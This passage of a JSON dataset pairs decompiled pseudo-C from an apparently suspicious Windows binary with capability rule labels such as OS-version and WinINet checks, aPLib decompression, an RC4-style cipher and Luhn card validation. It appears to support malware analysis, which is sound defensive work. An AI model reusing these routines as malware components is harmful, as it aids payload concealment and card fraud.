(var_74h <= var_148h) break;\n                            iVar8 = fcn.004101f0(var_11ch, var_118h, arg_ch[var_148h + 1]);\n                            iVar8 = iVar8 + _var_13ch;\n                            var_13ch = iVar8;\n                            _var_13ch = fcn.004117c0();\n                            var_138h = iVar8 >> 0x20;\n                            var_154h = iVar8;\n                            if (arg_8h[var_e4h + var_148h + 1] < var_154h) {\n                                _var_13ch = _var_13ch + 1;\n                            }\n                            arg_8h[var_e4h + var_148h + 1] = arg_8h[var_e4h + var_148h + 1] - var_154h;\n                            var_148h = var_148h + 1;\n                        }\n                        if ((var_138h != 0) || (var_f0h < var_13ch)) {\n                            var_160h = 0;\n                            var_16ch = 0;\n                            while( true ) {\n                                var_118h = _var_11ch >> 0x20;\n                                if (var_74h <= var_16ch) break;\n                                uVar3 = arg_8h[var_e4h + var_16ch + 1] + arg_ch[var_16ch + 1];\n                                var_17ch = uVar3 + var_160h;\n                                var_178h = CARRY4(arg_8h[var_e4h + var_16ch + 1], arg_ch[var_16ch + 1]) +\n                                           CARRY4(uVar3, var_160h);\n                                arg_8h[var_e4h + var_16ch + 1] = var_17ch;\n                                var_160h = fcn.004117c0();\n                                var_16ch = var_16ch + 1;\n                            }\n                            _var_11ch = CONCAT44(var_118h - (var_11ch == 0), var_11ch + -1);\n                        }\n                        var_ch = var_e4h + -1 + var_74h;\n                    }\n                    iVar8 = fcn.004117a0();\n                    _var_d8h = iVar8 - 0x120;\n                }\n                while (var_188h = uVar3 + 1,  var_188h < *arg_8h) {\n                    arg_8h[uVar3 + 2] = 0;\n                    uVar3 = var_188h;\n                }\n                *arg_8h = var_ch + 1;\n                while ((_var_5ch = CONCAT44(var_58h, var_5ch),  _var_4ch = CONCAT44(var_48h, var_4ch),  uVar7 = _var_d8h\n                       ,  *arg_8h != 0 &&\n                       (_var_5ch = CONCAT44(var_58h, var_5ch),  _var_4ch = CONCAT44(var_48h, var_4ch), \n                       arg_8h[*arg_8h] == 0))) {\n                    *arg_8h = *arg_8h - 1;\n                }\n            }\n        }\n    }\n    fcn.00411450(uVar7);\n    fcn.00405180(var_a24h);\n    var_4h = 0x40fb19;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 3947
    },
    "0040fb40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040fb40(int32_t *arg_8h)\n\n{\n    uint32_t var_c4h;\n    \n    var_c4h = *arg_8h == 0;\n    return arg_8h & 0xffffff00 | var_c4h;\n}\n",
        "token_count": 66
    },
    "0040fb80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fb80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint unaff_EBX;\n    uint *puVar2;\n    uint var_2a0h;\n    uint var_1e0h;\n    uint var_1d8h;\n    uint uStack472;\n    int32_t iStack468;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar2 = &fcn.0040fb80::var_1e0h;\n    for (iVar1 = 0x78; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    fcn.0040eda0();\n    uStack472 = arg_ch;\n    iStack468 = fcn.004117c0();\n    if (iStack468 == 0) {\n        var_2a0h = 1;\n    }\n    else {\n        var_2a0h = 2;\n    }\n    var_1d8h = var_2a0h;\n    fcn.0040ed30(&fcn.0040fb80::var_1d8h);\n    fcn.00411450(arg_8h, extraout_EDX);\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x40fc52;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 367
    },
    "0040fd70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fd70(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *puVar2;\n    uint64_t uVar3;\n    uchar var_67ch [3];\n    uint var_679h;\n    uint var_674h;\n    uint var_43ch;\n    uint32_t var_25ch;\n    uint32_t var_250h;\n    int32_t var_244h;\n    uint32_t var_238h;\n    uint32_t var_22ch;\n    uint32_t var_220h;\n    uint var_21ch;\n    uint32_t var_48h;\n    uint32_t var_3ch;\n    uint32_t *var_30h;\n    uint32_t *var_24h;\n    uint var_15h;\n    uint32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar2 = &fcn.0040fd70::var_43ch;\n    for (iVar1 = 0x10f; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    if (*arg_ch < 2) {\n        uVar3 = fcn.00410110(arg_8h, arg_ch[1]);\n    }\n    else if (*arg_8h < 2) {\n        var_ch = arg_8h[1];\n        fcn.0040ed30(arg_ch);\n        uVar3 = fcn.00410110(arg_8h, var_ch);\n    }\n    else {\n        var_15h._0_1_ = *arg_ch < *arg_8h;\n        if (var_15h) {\n            _var_67ch = arg_ch + 1;\n        }\n        else {\n            _var_67ch = arg_8h + 1;\n        }\n        var_24h = _var_67ch;\n        if (var_15h) {\n            _var_67ch = arg_8h + 1;\n        }\n        else {\n            _var_67ch = arg_ch + 1;\n        }\n        var_30h = _var_67ch;\n        if (var_15h) {\n            _var_67ch = *arg_ch;\n        }\n        else {\n            _var_67ch = *arg_8h;\n        }\n        var_3ch = _var_67ch;\n        if (var_15h) {\n            _var_67ch = *arg_8h;\n        }\n        else {\n            _var_67ch = *arg_ch;\n        }\n        var_48h = _var_67ch;\n        fcn.0040eda0();\n        for (var_22ch = 0; var_22ch != var_3ch; var_22ch = var_22ch + 1) {\n            var_238h = var_24h[var_22ch];\n            if (var_238h == 0) {\n                if (var_22ch == var_220h) {\n                    (&fcn.0040fd70::var_21ch)[var_22ch] = 0;\n                    var_220h = var_22ch + 1;\n                }\n            }\n            else {\n                var_244h = 0;\n                var_25ch = 0;\n                for (var_250h = var_22ch; (var_25ch != var_48h && (var_250h != 0x73)); var_250h = var_250h + 1) {\n                    if (var_250h == var_220h) {\n                        (&fcn.0040fd70::var_21ch)[var_250h] = 0;\n                        var_220h = var_250h + 1;\n                    }\n                    var_244h = fcn.0040eff0(&fcn.0040fd70::var_21ch + var_250h, var_238h, var_30h[var_25ch], var_244h);\n                    var_25ch = var_25ch + 1;\n                }\n                while ((var_244h != 0 && (var_250h != 0x73))) {\n                    if (var_250h == var_220h) {\n                        (&fcn.0040fd70::var_21ch)[var_250h] = 0;\n                        var_220h = var_250h + 1;\n                    }\n                    puVar2 = &fcn.0040fd70::var_21ch + var_250h;\n                    var_250h = var_250h + 1;\n                    var_244h = fcn.0040ef90(puVar2, 0, var_244h);\n                }\n                if (var_250h == 0x73) {\n                    arg_8h_00 = fcn.0040eda0();\n                    uVar3 = fcn.0040ed30(arg_8h_00);\n                    uVar3 = uVar3 & 0xffffffffffffff00;\n                    goto code_r0x004100c3;\n                }\n            }\n        }\n        uVar3 = fcn.0040ed30(&fcn.0040fd70::var_220h);\n        uVar3 = uVar3 & 0xffffffff00000000 | CONCAT31(uVar3 >> 8, 1);\n    }\ncode_r0x004100c3:\n    fcn.00411450(uVar3);\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x4100ee;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1304
    },
    "00410110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410110(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint *puVar3;\n    uint var_53ch;\n    uint var_3c0h;\n    uint var_364h;\n    uint32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar3 = &fcn.00410110::var_3c0h;\n    for (iVar2 = 0xf0; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    if (arg_ch == 0) {\n        uVar1 = fcn.0040eda0();\n        fcn.0040ed30(uVar1);\n    }\n    else if (((arg_ch != 1) && (*arg_8h != 0)) && (var_ch = fcn.004103f0(arg_8h + 1, *arg_8h, arg_ch),  var_ch != 0)) {\n        if (*arg_8h < 0x73) {\n            arg_8h[*arg_8h + 1] = var_ch;\n            *arg_8h = *arg_8h + 1;\n        }\n        else {\n            uVar1 = fcn.0040eda0();\n            fcn.0040ed30(uVar1);\n        }\n    }\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x4101e8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 404
    },
    "00410230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410230(uint arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    uint32_t var_574h;\n    uint var_56ch;\n    uint var_3f4h;\n    uint32_t var_214h;\n    int32_t s2;\n    int32_t var_1fch;\n    uint s1;\n    uint16_t *var_24h;\n    uint32_t var_18h;\n    uint32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    puVar4 = &fcn.00410230::var_3f4h;\n    for (iVar3 = 0xfd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    for (var_ch = arg_ch / 10; var_ch != 0; var_ch = var_ch - var_18h) {\n        if (var_ch < 0x27) {\n            var_574h = var_ch;\n        }\n        else {\n            var_574h = 0x26;\n        }\n        var_18h = var_574h;\n        var_24h = var_574h * 4 + 0x415a84;\n        fcn.0040eda0();\n        var_1fch = *(var_24h + 3) + *(var_24h + 1);\n        s2 = *var_24h * 4 + 0x415180;\n        sub.msvcrt.dll_memset(&fcn.00410230::s1, 0, *(var_24h + 1) << 2);\n        sub.msvcrt.dll_memcpy(&fcn.00410230::s1 + *(var_24h + 1), s2, *(var_24h + 3) << 2);\n        cVar1 = fcn.0040fd70(arg_8h, &fcn.00410230::var_1fch);\n        if (cVar1 == '\\0') {\n            arg_8h_00 = fcn.0040eda0();\n            uVar5 = fcn.0040ed30(arg_8h_00);\n            arg_ch = uVar5 >> 0x20;\n            uVar2 = uVar5 & 0xffffff00;\n            goto code_r0x0041039d;\n        }\n    }\n    uVar2 = arg_ch / 10;\n    arg_ch = arg_ch % 10;\n    var_214h = arg_ch;\n    if (arg_ch != 0) {\n        uVar6 = fcn.00410110(arg_8h, *(arg_ch * 4 + 0x415b1c));\n        arg_ch = uVar6 >> 0x20;\n        uVar2 = 0;\n        if ((uVar6 & 0xff) == 0) {\n            uVar2 = 0;\n            goto code_r0x0041039d;\n        }\n    }\n    uVar2 = CONCAT31(uVar2 >> 8, 1);\ncode_r0x0041039d:\n    fcn.00411450(uVar2, arg_ch);\n    fcn.00405180(unaff_EBX);\n    uStack12 = 0x4103c8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 827
    },
    "00410b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b60(int32_t s1, uint32_t arg_ch, int32_t s2, uint32_t n)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t var_e8h;\n    uint var_28h;\n    uint32_t var_20h;\n    uint32_t var_14h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar1 = &fcn.00410b60::var_28h;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0xcccccccc;\n        puVar1 = puVar1 + 1;\n    }\n    if (n != 0) {\n        var_e8h = s1 != 0;\n        var_8h = var_e8h;\n        if (var_e8h == 0) {\n            puVar1 = sub.msvcrt.dll__errno();\n            *puVar1 = 0x16;\n            fcn.00405b30();\n        }\n        else if ((s2 == 0) || (arg_ch < n)) {\n            sub.msvcrt.dll_memset(s1, 0, arg_ch);\n            var_e8h = s2 != 0;\n            var_14h = var_e8h;\n            if (var_e8h == 0) {\n                puVar1 = sub.msvcrt.dll__errno();\n                *puVar1 = 0x16;\n                fcn.00405b30();\n            }\n            else {\n                var_e8h = n <= arg_ch;\n                var_20h = var_e8h;\n                if (var_e8h == 0) {\n                    puVar1 = sub.msvcrt.dll__errno();\n                    *puVar1 = 0x22;\n                    fcn.00405b30();\n                }\n            }\n        }\n        else {\n            sub.msvcrt.dll_memcpy(s1, s2, n);\n        }\n    }\n    uStack8 = 0x410ca4;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 475
    },
    "00410d00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410d00(int32_t ptr, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t var_e8h;\n    uint var_28h;\n    int32_t var_20h;\n    uint32_t size;\n    uint32_t s;\n    uint uStack8;\n    \n    puVar1 = &fcn.00410d00::var_28h;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = 0xcccccccc;\n        puVar1 = puVar1 + 1;\n    }\n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (ptr == 0) {\n            var_e8h = 0;\n        }\n        else {\n            var_e8h = sub.msvcrt.dll__msize(ptr);\n        }\n        s = var_e8h;\n        size = arg_ch * arg_10h;\n        var_20h = sub.msvcrt.dll_realloc(ptr, size);\n        if ((var_20h != 0) && (s < size)) {\n            sub.msvcrt.dll_memset(var_20h + s, 0, size - s);\n        }\n    }\n    else {\n        puVar1 = sub.msvcrt.dll__errno();\n        *puVar1 = 0xc;\n    }\n    uStack8 = 0x410dc2;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 358
    },
    "00411d30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_414h\n\nvoid fcn.00411d30(void)\n\n{\n    int32_t iVar1;\n    uint var_414h;\n    uint var_20ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41900c ^ &stack0xfffffffc;\n    if (*0x419634 == '\\0') {\n        *0x419634 = '\\x01';\n        iVar1 = fcn.00411e80();\n        if ((iVar1 == 0) &&\n           (((((iVar1 = fcn.00412590(L\"VCRUNTIME140D.dll\"),  iVar1 == 0 ||\n               (iVar1 = fcn.00412540(iVar1, &var_414h, 0x104),  iVar1 == 0)) ||\n              (iVar1 = fcn.004120e0(&var_414h, &var_20ch, 0x104),  iVar1 == 0)) ||\n             ((iVar1 = fcn.004125d0(&var_20ch, 0, 0x900),  iVar1 == 0 &&\n              ((iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 != 0x57 ||\n               (iVar1 = fcn.004125d0(&var_20ch, 0, 8),  iVar1 == 0)))))) &&\n            ((iVar1 = fcn.004125d0(L\"MSPDB140\", 0, 0xa00),  iVar1 == 0 &&\n             (((iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x57 &&\n               (iVar1 = fcn.00412540(0, &var_414h, 0x104),  iVar1 != 0)) &&\n              (iVar1 = fcn.004120e0(&var_414h, &var_20ch, 0x104),  iVar1 != 0)))))))) {\n            fcn.004125d0(&var_20ch, 0, 8);\n            fcn.00405180(var_414h);\n            return;\n        }\n    }\n    fcn.00405180(var_414h);\n    return;\n}\n",
        "token_count": 500
    },
    "00403290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403290(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00402fd0(param_1[1], *param_1);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00403a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.004014c0();\n    iVar3 = fcn.004014c0();\n    if (iVar2 != iVar3) {\n        iVar2 = fcn.00405830(2, 0x416b40, 0x805, 0, 0x41667c, \"string iterators in range are from different containers\")\n        ;\n        if (iVar2 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.00405a50(L\"\\\"string iterators in range are from different containers\\\"\", 0x4167ac, \n                     L\"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\2022\\\\Community\\\\VC\\\\Tools\\\\MSVC\\\\14.33.31629\\\\include\\\\xstring\"\n                     , 0x805, 0);\n    }\n    if (*(arg_ch + 8) <= *(arg_8h + 8) && *(arg_8h + 8) != *(arg_ch + 8)) {\n        iVar2 = fcn.00405830(2, 0x416b40, 0x806, 0, 0x41667c, \"string iterator range transposed\");\n        if (iVar2 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.00405a50(L\"\\\"string iterator range transposed\\\"\", 0x4167ac, \n                     L\"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\2022\\\\Community\\\\VC\\\\Tools\\\\MSVC\\\\14.33.31629\\\\include\\\\xstring\"\n                     , 0x806, 0);\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "0040a810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a810(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uint var_f4h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040a810::var_34h;\n    for (iVar1 = 0xd; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_2ch = fcn.00404a10();\n    (*_sym.imp.msvcrt.dll___getmainargs)\n              (&fcn.0040a810::var_8h, &fcn.0040a810::var_14h, &fcn.0040a810::var_20h, arg_8h != 1, \n               &fcn.0040a810::var_2ch);\n    uVar3 = fcn.004114b0();\n    fcn.00411450(uVar3);\n    uStack8 = 0x40a899;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 299
    },
    "004115d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004115d0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t **ppiVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.004052d0(arg_8h, arg_ch, arg_10h, arg_14h);\n    if ((((arg_8h[1] & 0x66U) == 0) && (*arg_8h == -0x1f928c9d)) && (iVar1 == 1)) {\n        ppiVar2 = fcn.004057a0();\n        *ppiVar2 = arg_8h;\n        puVar3 = fcn.004057e0();\n        *puVar3 = arg_10h;\n        sub.msvcrt.dll_void___cdecl_terminate_void_();\n    }\n    return iVar1;\n}\n",
        "token_count": 216
    },
    "00406750": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00406750(uint noname_0, uint noname_1, uint arg_10h, int32_t arg_14h)\n\n{\n    bool bVar1;\n    uint var_dch;\n    uint var_11h;\n    uint var_5h;\n    \n    if (arg_14h == 2) {\n        bVar1 = false;\n    }\n    else if (arg_14h == 3) {\n        bVar1 = true;\n    }\n    else if (arg_14h == 0xc) {\n        bVar1 = true;\n    }\n    else if (arg_14h == 0xd) {\n        bVar1 = false;\n    }\n    else {\n        if ((arg_10h == 'c') || (arg_10h == 's')) {\n            bVar1 = true;\n        }\n        else {\n            bVar1 = false;\n        }\n        bVar1 = !bVar1;\n    }\n    return bVar1;\n}\n",
        "token_count": 218
    },
    "00407550": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00407550(uint32_t param_1)\n\n{\n    uint32_t var_d0h;\n    uint var_8h;\n    \n    *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n    var_d0h = *(param_1 + 0x450) != 2;\n    return param_1 & 0xffffff00 | var_d0h;\n}\n",
        "token_count": 100
    },
    "00411850": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00411850(void)\n\n{\n    uint32_t uVar1;\n    float10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    if (1 < *0x41921c) {\n        return in_ST0;\n    }\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    uVar1 = in_ST0 < 0;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack28 < 0) {\n        if (uStack24 < 0x401e) {\n            return (uStack28 >> (0x3eU - uStack24 & 0x1f) ^ -uVar1) + uVar1;\n        }\n        if (((uStack24 < 0x401f) && (uVar1 != 0)) && (uStack28 == 0x80000000)) {\n            return uStack28;\n        }\n    }\n    return 0x80000000;\n}\n",
        "token_count": 260
    },
    "00406150": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00406150(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406150::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004053f0();\n    uStack8 = 0x4061a7;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 145
    },
    "00402140": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402140(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_2h = 0;\n    *(arg_10h + 0x100) = 0;\n    *(arg_10h + 0x101) = 0;\n    for (var_8h._0_2_ = 0; var_8h < 0x100; var_8h._0_2_ = var_8h + 1) {\n        *(arg_10h + var_8h) = var_8h;\n    }\n    for (var_8h._0_2_ = 0; var_8h < 0x100; var_8h._0_2_ = var_8h + 1) {\n        var_2h = *(arg_8h + var_1h) + *(arg_10h + var_8h) + var_2h;\n        uVar1 = *(arg_10h + var_8h);\n        *(arg_10h + var_8h) = *(arg_10h + var_2h);\n        *(arg_10h + var_2h) = uVar1;\n        var_1h._0_1_ = var_1h + 1;\n        if (var_1h == arg_ch) {\n            var_1h._0_1_ = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "00402240": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402240(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint32_t var_ch;\n    uint var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *(arg_10h + 0x100);\n    var_2h = *(arg_10h + 0x101);\n    for (var_ch = 0; var_ch < arg_ch; var_ch = var_ch + 1) {\n        var_1h._0_1_ = var_1h + 1;\n        var_2h = *(arg_10h + var_1h) + var_2h;\n        uVar1 = *(arg_10h + var_1h);\n        *(arg_10h + var_1h) = *(arg_10h + var_2h);\n        *(arg_10h + var_2h) = uVar1;\n        *(arg_8h + var_ch) = *(arg_8h + var_ch) ^ *(arg_10h + (*(arg_10h + var_1h) + *(arg_10h + var_2h) & 0xff));\n    }\n    *(arg_10h + 0x100) = var_1h;\n    *(arg_10h + 0x101) = var_2h;\n    return;\n}\n",
        "token_count": 356
    },
    "00402ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ea0(uint s1, uint s2, int32_t n)\n\n{\n    (*_sym.imp.msvcrt.dll_memcpy)(s1, s2, n << 1);\n    return s1;\n}\n",
        "token_count": 53
    },
    "00403560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403560(uint s1, uint s2, int32_t n)\n\n{\n    (*_sym.imp.msvcrt.dll_memmove)(s1, s2, n << 1);\n    return s1;\n}\n",
        "token_count": 53
    },
    "00406210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
